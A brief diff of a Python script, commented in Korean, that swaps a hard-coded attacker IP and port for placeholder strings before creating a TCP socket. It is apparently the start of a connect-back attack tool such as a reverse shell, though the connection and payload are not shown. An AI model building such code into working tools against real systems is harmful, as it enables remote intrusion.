@@ -4,8 +4,8 @@ import os
 import locale
 
 # 공격자의 IP 주소와 포트 번호 설정
-attacker_ip = "192.168.56.5"
-attacker_port = 7777
+attacker_ip = "attacker_ip"
+attacker_port = "attacker_port"
 
 # 소켓 객체 생성
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
